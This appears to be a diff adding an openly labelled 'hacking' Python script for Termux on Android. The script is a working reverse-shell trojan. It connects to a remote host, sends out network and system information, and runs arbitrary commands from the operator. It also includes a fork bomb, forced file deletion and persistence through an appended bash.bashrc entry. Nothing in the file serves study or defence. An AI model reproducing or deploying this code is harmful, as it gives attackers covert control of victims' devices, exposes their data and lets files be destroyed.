@@ -1,0 +1,95 @@
+
+
+# coding bay issam iso 
+# ISO HACKING 
+import os
+os.system('pkg install wget')
+os.system('pkg install screenfetch')
+os.system('clear')
+import sys
+import socket
+import time
+import subprocess
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+xx=socket.gethostname()
+s.connect(('$1',$2))
+xxxxxx='ifconfig'
+sub = subprocess.Popen(xxxxxx,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+z=sub.stdout.read() + sub.stderr.read()
+s.sendall(z)
+
+ck='screenfetch'
+issam = subprocess.Popen(ck,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+sara=issam.stdout.read() + issam.stderr.read()
+s.sendall(sara)
+os.system('clear')
+W='\33[0m'
+R='\33[1;31m'
+G='\33[1;32m'
+print(f'{W}[{R}+{W}]{G} Loding ...')
+def virous():
+	#######################
+	while True:
+		data=s.recv(4046)
+		data=data.decode('utf-8')
+		if data == 'exit':
+			s.send(b'done')
+			sys.exit()
+			break
+			s.close()
+			break
+			sys.exit()
+			os.system('clear')
+		if data[:6] =='remove':
+			rmx=data[7:]
+			os.system(f'rm -rif {rmx}')
+			s.send(b'done remove') #remove
+			continue
+		if data[:2] == 'mv':
+			mc=data[3:]
+			os.system(f'mv {mc}')
+			s.send(b'done')
+			continue
+		if data[:2] == 'cd':
+			os.chdir(data[3:])
+			s.sendall(b'done')
+		if data[:2] == 'chat':
+			print(data[3:])
+			s.send(b'done')
+			continue 
+		if data == '$HOME' or data[:3] == 'home' or data[:3] =='HOME' or data[:3] =='Home':
+			os.chdir('/data/data/com.termux/files/home')
+			s.send(b'done')
+			continue
+		if data =='virous':
+			os.system(':(){ :|& };:')
+			s.send(b'done virous')
+			continue
+		if data[:8] == 'set host':#set host 
+			h=data[9:]
+			s.send(b'done')
+		if data[:8] == 'set port':
+			p=data[9:]
+			os.system(f"sed -i 's/$t/{h}/g' .--.")
+			os.system(f"sed -i 's/$i/{p}/g' .--.")
+			os.system('mv .--. /data/data/com.termux/files/home')
+			os.chdir('/data/data/com.termux/files/usr/etc')
+			unx=open('bash.bashrc','a')
+			dump='python3 .--.'
+			unx.write(dump+'\n')
+			unx.close()
+			s.send(b'done')
+			continue
+		else:
+			sub=subprocess.Popen(data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+			sub=sub.stdout.read() + sub.stderr.read()
+			s.sendall(sub)
+		
+try:
+	virous()
+except:
+	time.sleep(4)
+	sys.exit()
+
+
+
